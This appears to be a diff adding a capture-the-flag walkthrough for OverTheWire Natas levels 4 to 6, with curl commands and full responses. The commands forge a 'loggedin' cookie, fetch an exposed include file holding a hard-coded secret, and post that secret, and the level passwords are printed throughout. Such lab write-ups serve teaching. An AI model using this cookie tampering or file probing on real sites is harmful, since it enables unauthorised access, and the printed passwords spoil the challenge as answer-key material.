@@ -252,3 +252,144 @@ Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
 <Callout type="success" title="Password natas5">
 e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
 </Callout>
+
+## Natas Level 4 → Level 5
+
+[Natas Level 4 → Level 5](https://overthewire.org/wargames/natas/natas5.html)
+
+```bash
+curl -I http://natas5.natas.labs.overthewire.org/index.php --user natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
+```
+
+```html
+HTTP/1.1 200 OK
+Date: Sat, 11 Jul 2026 17:32:14 GMT
+Server: Apache/2.4.66 (Ubuntu)
+Set-Cookie: loggedin=0
+Content-Type: text/html; charset=UTF-8
+```
+
+```bash
+curl --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org/index.php --user natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas5", "pass": "e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M" };</script></head>
+<body>
+<h1>natas5</h1>
+<div id="content">
+Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT</div>
+</body>
+</html>
+```
+
+<Callout type="success" title="Password natas6">
+7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
+</Callout>
+
+## Natas Level 5 → Level 6
+
+[Natas Level 5 → Level 6](https://overthewire.org/wargames/natas/natas6.html)
+
+```bash
+curl http://natas6.natas.labs.overthewire.org/ --user natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas6", "pass": "7mhjtShJAcld2NYbKHEadnhEwRn2P8VT" };</script></head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+[http://natas6.natas.labs.overthewire.org/index-source.html](http://natas6.natas.labs.overthewire.org/index-source.html)
+
+```php
+<?
+
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+```
+
+```bash
+curl http://natas6.natas.labs.overthewire.org/includes/secret.inc --user natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
+```
+
+```php
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+```
+
+```bash
+curl -X POST http://natas6.natas.labs.overthewire.org/ --user natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT -d 
+"secret=FOEIUWGHFEEUHOFUOIU" -d "submit=Submit Query"
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas6", "pass": "7mhjtShJAcld2NYbKHEadnhEwRn2P8VT" };</script></head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+<Callout type="success" title="Password natas7">
+B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
+</Callout>
